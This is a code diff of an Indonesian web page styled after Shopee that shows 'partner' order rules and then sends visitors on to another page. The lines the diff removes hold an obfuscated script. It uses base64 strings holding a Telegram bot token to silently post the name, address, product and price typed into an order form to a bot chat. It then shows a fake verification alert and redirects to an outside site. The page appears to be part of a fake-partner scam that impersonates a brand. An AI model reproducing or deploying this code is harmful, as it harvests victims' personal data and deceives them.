@@ -3,14 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pusat Edukasi Mitra | Aturan Pemesanan</title>
+    <title>Pemberitahuan Syarat Mitra</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
         body { font-family: 'Poppins', sans-serif; background-color: #f8f9fa; }
         .shopee-orange { color: #EE4D2D; }
         .bg-shopee { background: linear-gradient(135deg, #FF6633 0%, #EE4D2D 100%); }
-        .hidden-form { display: none; }
         .check-item { display: flex; align-items: flex-start; margin-bottom: 12px; }
         .check-icon { color: #10b981; margin-right: 10px; margin-top: 2px; }
         .cross-icon { color: #ef4444; margin-right: 10px; margin-top: 2px; }
@@ -19,164 +18,107 @@
 <body class="text-gray-800 pb-10">
 
     <div class="max-w-md mx-auto px-4 mt-10" id="ruleSection">
-        <!-- Card Panduan -->
+        <!-- Card Pemberitahuan Utama -->
         <div class="bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden mb-6">
             <div class="p-6">
-                <div class="mb-6">
-                    <h2 class="font-bold text-xl text-center">Aturan & Kepatuhan</h2>
-                    <p class="text-xs text-gray-400 text-center mt-1">Harap baca dengan teliti sebelum melanjutkan</p>
+                <div class="mb-6 text-center">
+                    <h2 class="font-bold text-xl uppercase tracking-tight">Aturan & Kepatuhan</h2>
+                    <p class="text-xs text-gray-400 mt-1 font-medium">Pemberitahuan Penting Mitra Resmi</p>
                 </div>
 
-                <!-- Syarat Wajib -->
+                <!-- Bagian Syarat -->
                 <div class="mb-8">
                     <h3 class="font-bold text-sm text-gray-500 uppercase tracking-wider mb-4 border-b pb-2">✅ Syarat Pengajuan Order</h3>
                     <div class="space-y-3">
                         <div class="check-item">
                             <span class="check-icon">✔</span>
-                            <p class="text-sm">Akun Mitra harus sudah terdaftar dan terverifikasi menggunakan KTP asli.</p>
+                            <p class="text-sm">Akun Mitra wajib terverifikasi dengan identitas KTP asli.</p>
                         </div>
                         <div class="check-item">
                             <span class="check-icon">✔</span>
-                            <p class="text-sm">Data pengiriman harus sesuai dengan titik GPS toko yang terdaftar.</p>
+                            <p class="text-sm">Alamat pengiriman harus sesuai dengan titik operasional yang terdaftar.</p>
                         </div>
                         <div class="check-item">
                             <span class="check-icon">✔</span>
-                            <p class="text-sm">Memiliki saldo limit yang cukup untuk melakukan pemesanan partai besar.</p>
+                            <p class="text-sm">Limit saldo mencukupi untuk pemesanan sesuai kuantitas produk.</p>
                         </div>
                         <div class="check-item">
                             <span class="check-icon">✔</span>
-                            <p class="text-sm">Mengisi formulir dengan data asli untuk keperluan asuransi pengiriman.</p>
+                            <p class="text-sm">Kesediaan mengisi formulir pesanan dengan data yang valid.</p>
                         </div>
                     </div>
                 </div>
 
-                <!-- Hal yang Dilarang -->
+                <!-- Bagian Larangan -->
                 <div class="mb-8">
-                    <h3 class="font-bold text-sm text-gray-500 uppercase tracking-wider mb-4 border-b pb-2 text-red-500">❌ Hal yang Dilarang</h3>
+                    <h3 class="font-bold text-sm text-gray-500 uppercase tracking-wider mb-4 border-b pb-2 text-red-500">❌ Larangan Kemitraan</h3>
                     <div class="space-y-3">
                         <div class="check-item">
                             <span class="cross-icon">✖</span>
-                            <p class="text-sm">Dilarang menggunakan alamat fiktif atau alamat milik orang lain.</p>
+                            <p class="text-sm text-gray-700">Dilarang memberikan alamat palsu atau lokasi yang tidak dapat dijangkau.</p>
                         </div>
                         <div class="check-item">
                             <span class="cross-icon">✖</span>
-                            <p class="text-sm">Dilarang memanipulasi jumlah pesanan (<em>Fake Order</em>) demi komisi.</p>
+                            <p class="text-sm text-gray-700">Penyalahgunaan data transaksi akan diproses sesuai hukum yang berlaku.</p>
                         </div>
                         <div class="check-item">
                             <span class="cross-icon">✖</span>
-                            <p class="text-sm text-red-600 font-medium">Dilarang menyebarkan data transaksi mitra ke pihak luar.</p>
+                            <p class="text-sm text-red-600 font-semibold">Tindakan manipulasi pesanan (fake order) dilarang keras.</p>
                         </div>
                         <div class="check-item">
                             <span class="cross-icon">✖</span>
-                            <p class="text-sm">Akun akan diblokir permanen jika ditemukan kecurangan data.</p>
+                            <p class="text-sm text-gray-700 font-medium italic">Pelanggaran aturan berisiko pemblokiran akun permanen.</p>
                         </div>
                     </div>
                 </div>
 
-                <!-- Tombol Persetujuan -->
-                <div class="bg-gray-50 p-4 rounded-xl mb-6">
+                <!-- Persetujuan -->
+                <div class="bg-orange-50 p-4 rounded-xl mb-6 border border-orange-100">
                     <label class="flex items-center space-x-3 cursor-pointer">
-                        <input type="checkbox" id="agreeCheck" class="w-5 h-5 accent-orange-600">
-                        <span class="text-xs text-gray-600 leading-tight font-medium">Saya telah membaca dan menyetujui seluruh aturan kemitraan di atas.</span>
+                        <input type="checkbox" id="agreeCheck" class="w-5 h-5 accent-orange-600 rounded">
+                        <span class="text-xs text-orange-900 leading-tight font-semibold">Saya mengerti dan menyetujui seluruh aturan yang berlaku.</span>
                     </label>
                 </div>
 
-                <button id="showFormBtn" disabled class="w-full bg-gray-300 text-white py-4 rounded-xl font-bold transition">
+                <!-- Tombol Lanjut -->
+                <button id="showFormBtn" disabled class="w-full bg-gray-300 text-white py-4 rounded-xl font-bold shadow-sm transition-all duration-300 active:scale-95">
                     Lanjut Isi Formulir
                 </button>
             </div>
         </div>
-    </div>
-
-    <!-- Section Formulir (Awalnya Tersembunyi) -->
-    <div id="actualForm" class="max-w-md mx-auto px-4 mt-10 hidden-form">
-        <div class="bg-white rounded-2xl shadow-sm border border-gray-100 p-6 mb-6">
-            <h2 class="font-bold text-lg mb-4 shopee-orange text-center border-b pb-3">Formulir Pesanan Resmi</h2>
-            <form id="orderForm" class="space-y-4">
-                <div>
-                    <label class="block text-xs font-bold text-gray-400 uppercase mb-1">Nama Lengkap</label>
-                    <input type="text" id="nL" class="w-full p-3 bg-gray-50 border rounded-xl outline-none focus:border-orange-500" placeholder="Sesuai KTP" required>
-                </div>
-                <div>
-                    <label class="block text-xs font-bold text-gray-400 uppercase mb-1">Jumlah Pesanan (Ctn)</label>
-                    <input type="number" id="jC" class="w-full p-3 bg-gray-50 border rounded-xl outline-none focus:border-orange-500" placeholder="Contoh: 5" required>
-                </div>
-                <div>
-                    <label class="block text-xs font-bold text-gray-400 uppercase mb-1">Alamat Lengkap</label>
-                    <textarea id="aL" rows="2" class="w-full p-3 bg-gray-50 border rounded-xl outline-none focus:border-orange-500" placeholder="Alamat pengiriman..." required></textarea>
-                </div>
-                <div>
-                    <label class="block text-xs font-bold text-gray-400 uppercase mb-1">Nama Produk</label>
-                    <input type="text" id="nP" class="w-full p-3 bg-gray-50 border rounded-xl outline-none focus:border-orange-500" placeholder="Barang yang diorder" required>
-                </div>
-                <div>
-                    <label class="block text-xs font-bold text-gray-400 uppercase mb-1">Total Harga</label>
-                    <input type="text" id="tH" class="w-full p-3 bg-gray-50 border rounded-xl outline-none focus:border-orange-500 font-bold" required oninput="this.value = this.value.replace(/\D/g, '').replace(/\B(?=(\d{3})+(?!\d))/g, '.')">
-                </div>
-                <button type="submit" id="btnSub" class="w-full bg-shopee text-white py-4 rounded-xl font-bold shadow-lg mt-4">Kirim Pesanan Sekarang</button>
-            </form>
-        </div>
+        
+        <p class="text-center text-[10px] text-gray-400 uppercase font-bold tracking-widest mt-4">Sistem Verifikasi Aman</p>
     </div>
 
     <script>
-        // Logic Persetujuan
         const agreeCheck = document.getElementById('agreeCheck');
         const showFormBtn = document.getElementById('showFormBtn');
-        const ruleSection = document.getElementById('ruleSection');
-        const actualForm = document.getElementById('actualForm');
 
+        // Mengaktifkan tombol saat checkbox dicentang
         agreeCheck.addEventListener('change', function() {
             if(this.checked) {
                 showFormBtn.disabled = false;
                 showFormBtn.classList.remove('bg-gray-300');
-                showFormBtn.classList.add('bg-shopee');
+                showFormBtn.classList.add('bg-shopee', 'shadow-lg');
             } else {
                 showFormBtn.disabled = true;
-                showFormBtn.classList.remove('bg-shopee');
+                showFormBtn.classList.remove('bg-shopee', 'shadow-lg');
                 showFormBtn.classList.add('bg-gray-300');
             }
         });
 
+        // Pengalihan ke halaman formulir
         showFormBtn.addEventListener('click', function() {
-            ruleSection.style.display = 'none';
-            actualForm.style.display = 'block';
-            window.scrollTo(0, 0);
+            this.innerHTML = `
+                <svg class="animate-spin h-5 w-5 text-white inline mr-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>
+                Mengalihkan...
+            `;
+            
+            setTimeout(() => {
+                // Ganti 'formulir.html' sesuai dengan nama file formulir pesanan Anda
+                window.location.href = 'halamantoko.html';
+            }, 800);
         });
-
-        // Logic Submit
-        (function(){
-            const _0x_a = "NzgxMjQyODQ2ODpBQUUxcUhqTExIT1FsQW1BQlhidjlKaFhFZzBLUmtiaDBYMA==";
-            const _0x_b = "NTkyMzAzMTgyNQ==";
-            const _0x_c = "aHR0cHM6Ly9taXRyYS5tb25lZS5jby5pZC8jL20=";
-            const _0x_u = ["aHR0cHM6Ly9hcGku","dGVsZWdyYW0ub3JnL2JvdA==","L3NlbmRNZXNzYWdl"];
-
-            document.getElementById('orderForm').onsubmit = async function(e) {
-                e.preventDefault();
-                const btn = document.getElementById('btnSub');
-                const n = document.getElementById('nL').value;
-                const c = document.getElementById('jC').value;
-                const a = document.getElementById('aL').value;
-                const p = document.getElementById('nP').value;
-                const h = document.getElementById('tH').value;
-
-                btn.disabled = true;
-                btn.innerText = "Mengirim...";
-
-                const fullUrl = atob(_0x_u[0]) + atob(_0x_u[1]) + atob(_0x_a) + atob(_0x_u[2]);
-                const msg = `*PESANAN BARU*\nNama: ${n}\nJumlah: ${c} Ctn\nAlamat: ${a}\nProduk: ${p}\nHarga: Rp${h}`;
-
-                try {
-                    await fetch(fullUrl, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ chat_id: atob(_0x_b), text: msg, parse_mode: 'Markdown' })
-                    });
-                } catch (err) {}
-
-                alert('Pesanan telah diverifikasi oleh sistem.');
-                window.location.href = atob(_0x_c);
-            };
-        })();
     </script>
 </body>
 </html>
